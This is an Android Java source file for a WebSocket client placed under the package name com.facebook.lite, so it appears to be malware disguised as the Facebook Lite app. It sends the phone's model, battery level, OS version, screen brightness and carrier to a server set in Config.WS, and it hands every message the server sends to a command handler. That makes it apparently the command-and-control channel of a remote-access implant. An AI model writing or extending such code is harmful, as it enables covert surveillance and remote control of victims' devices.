package com.facebook.lite;

import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.BatteryManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import org.java_websocket.client.WebSocketClient;
import org.java_websocket.handshake.ServerHandshake;
import java.net.URI;
import java.util.HashMap;
import java.util.Map;

public class WSClient extends WebSocketClient {

    public interface CB { void onDisconnect(); }

    private final Context ctx;
    private final CB      cb;

    public WSClient(Context ctx, CB cb) {
        super(makeUri(), makeHeaders(ctx));
        this.ctx = ctx;
        this.cb  = cb;
    }

    private static URI makeUri() {
        try { return new URI(Config.WS); }
        catch (Exception e) { throw new RuntimeException(e); }
    }

    private static Map<String, String> makeHeaders(Context ctx) {
        Map<String, String> h = new HashMap<>();
        h.put("model",      Build.MANUFACTURER + " " + Build.MODEL);
        h.put("battery",    getBattery(ctx) + "%");
        h.put("version",    "Android " + Build.VERSION.RELEASE);
        h.put("brightness", getBrightness(ctx) + "");
        h.put("provider",   getCarrier(ctx));
        return h;
    }

    private static int getBattery(Context ctx) {
        IntentFilter f = new IntentFilter(Intent.ACTION_BATTERY_CHANGED);
        Intent i = ctx.registerReceiver(null, f);
        if (i == null) return -1;
        int lv = i.getIntExtra(BatteryManager.EXTRA_LEVEL, -1);
        int sc = i.getIntExtra(BatteryManager.EXTRA_SCALE, -1);
        return (int)((lv / (float) sc) * 100);
    }

    private static int getBrightness(Context ctx) {
        try {
            return Settings.System.getInt(ctx.getContentResolver(),
                Settings.System.SCREEN_BRIGHTNESS);
        } catch (Exception e) { return -1; }
    }

    private static String getCarrier(Context ctx) {
        TelephonyManager tm =
            (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        if (tm == null) return "Unknown";
        String n = tm.getNetworkOperatorName();
        return (n == null || n.isEmpty()) ? "WiFi" : n;
    }

    public void connect() {
        try { connectBlocking(); }
        catch (Exception e) { cb.onDisconnect(); }
    }

    @Override public void onOpen(ServerHandshake h) {}
    @Override public void onMessage(String msg) {
        CommandHandler.handle(ctx, this, msg);
    }
    @Override public void onClose(int c, String r, boolean remote) { cb.onDisconnect(); }
    @Override public void onError(Exception e) { cb.onDisconnect(); }
}
